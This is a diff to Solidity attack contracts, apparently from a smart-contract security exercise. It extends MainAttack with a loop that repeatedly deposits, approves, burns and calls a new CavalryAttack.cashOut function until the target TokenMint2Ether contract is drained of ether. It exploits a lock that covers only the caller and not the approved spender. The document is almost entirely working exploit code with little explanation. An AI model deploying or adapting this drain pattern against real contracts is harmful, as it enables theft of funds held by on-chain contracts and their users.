@@ -35,13 +35,17 @@ contract MainAttack {
     uint256 public constant AMOUNT = 1 ether;
 
     constructor(address _tm) { tokenMint = TokenMint2Ether(_tm); }
-    function setCav(address _c) external { cavalry = CavalryAttack(_c); }
+    function setCav(address payable _c) external { cavalry = CavalryAttack(_c); }
 
     function attack() external payable {
         require(msg.value >= AMOUNT);
+        while (address(tokenMint).balance >= AMOUNT) {
         tokenMint.deposit{value: AMOUNT}();
         tokenMint.approve(address(cavalry), AMOUNT);   // let Cavalry pull Main's balance
-        tokenMint.burn2Ether();                        // lock[Main]=true; callback -> fallback
+        tokenMint.burn2Ether();
+        cavalry.cashOut();  
+      }
+                      // lock[Main]=true; callback -> fallback
     }
 
     fallback() external payable {
@@ -61,9 +65,14 @@ contract CavalryAttack {
     function setMain(address payable _m) external { main = MainAttack(_m); }
 
     function pull() external {
-        // msg.sender = Cavalry (not locked); from = Main (balance still non-zero)
-        tokenMint.transferFrom(address(main), AMOUNT);
+      // msg.sender = Cavalry (not locked); from = Main (balance still non-zero)
+      tokenMint.transferFrom(address(main), AMOUNT);        
     }
 
+    function cashOut() external {
+      tokenMint.burn2Ether();
+    }
+
+    receive() external payable {}
     function getBalance() public view returns (uint256) { return address(this).balance; }
 }
